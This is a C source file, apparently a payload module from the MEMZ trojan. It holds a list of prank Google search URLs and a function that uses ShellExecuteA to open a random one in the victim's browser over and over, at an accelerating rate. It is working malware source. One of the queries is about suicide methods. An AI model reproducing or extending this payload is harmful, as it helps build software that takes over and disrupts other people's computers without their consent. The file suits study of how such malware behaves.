#include "../MEMZ.h"
char *sites[] = {
	"http://google.co.ck/search?q=best+way+to+kill+yourself",
	"http://google.co.ck/search?q=how+2+remove+a+virus",
	"http://google.co.ck/search?q=mcafee+vs+norton", 
	"http://google.co.ck/search?q=how+to+send+a+virus+to+my+friend",
	"http://google.co.ck/search?q=minecraft+hax+download+no+virus",
	"http://google.co.ck/search?q=how+to+get+money",
	"http://google.co.ck/search?q=bonzi+buddy+download+free",
	"http://google.co.ck/search?q=how+2+buy+weed",
	"http://google.co.ck/search?q=how+to+code+a+virus+in+visual+basic",
	"http://google.co.ck/search?q=what+happens+if+you+delete+system32",
	"http://google.co.ck/search?q=g3t+r3kt",
	"http://google.co.ck/search?q=batch+virus+download",
	"http://google.co.ck/search?q=virus.exe",
	"http://google.co.ck/search?q=internet+explorer+is+the+best+browser",
	"http://google.co.ck/search?q=facebook+hacking+tool+free+download+no+virus+working+2016",
	"http://google.co.ck/search?q=virus+builder+legit+free+download",
	"http://google.co.ck/search?q=how+to+create+your+own+ransomware",
	"http://google.co.ck/search?q=how+to+remove+memz+trojan+virus",
	"http://google.co.ck/search?q=my+computer+is+doing+weird+things+wtf+is+happenin+plz+halp",
	"http://google.co.ck/search?q=dank+memz",
	"http://google.co.ck/search?q=how+to+download+memz",
	"http://google.co.ck/search?q=half+life+3+release+date",
	"http://google.co.ck/search?q=is+illuminati+real",
	"http://google.co.ck/search?q=montage+parody+making+program+2016",
	"http://google.co.ck/search?q=the+memz+are+real",
	"http://google.co.ck/search?q=stanky+danky+maymays",
	"http://google.co.ck/search?q=john+cena+midi+legit+not+converted",
	"http://google.co.ck/search?q=vinesauce+meme+collection",
	"http://google.co.ck/search?q=skrillex+scay+onster+an+nice+sprites+midi",
};
PAYLOADFUNCTIONDEFAULT(payloadExecute) {
	PAYLOADHEAD

		ShellExecuteA(NULL, "open", (LPCSTR)sites[random() % (sizeof(sites) / sizeof(sites[0]))], NULL, NULL, SW_SHOWDEFAULT);

	out: return 1500.0 / (times / 15.0 + 1) + 100 + (random() % 200);
}